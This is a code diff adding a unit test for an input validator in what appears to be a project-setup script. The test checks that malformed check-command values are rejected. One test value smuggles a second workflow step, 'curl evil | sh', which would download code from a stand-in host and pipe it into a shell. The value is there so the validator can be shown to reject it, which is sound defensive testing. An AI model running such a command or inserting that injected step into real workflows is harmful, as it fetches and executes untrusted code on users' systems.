@@ -5,6 +5,13 @@ import { validateInputs, ownerExists } from "../scripts/validate.mjs";
 const OK = { PROJECT_NAME: "Demo", PROJECT_DESCRIPTION: "A demo app.", OWNER: "@acme", CHECK_COMMANDS: "npm test" };
 const errorsFor = (over) => validateInputs({ ...OK, ...over });
 
+test("check: rejects blank, multi-line, control-char, over-long and placeholder-like values", () => {
+  const bad = ["  ", "npm test\n      - run: curl evil | sh", "a\tb", "x".repeat(301), "{{OWNER}}", undefined];
+  for (const v of bad) {
+    assert.match(errorsFor({ CHECK_COMMANDS: v }).join(), /--check/, JSON.stringify(v));
+  }
+});
+
 test("valid inputs produce no errors, for a user and for an org team", () => {
   assert.deepEqual(validateInputs(OK), []);
   assert.deepEqual(errorsFor({ OWNER: "@acme/core-team" }), []);
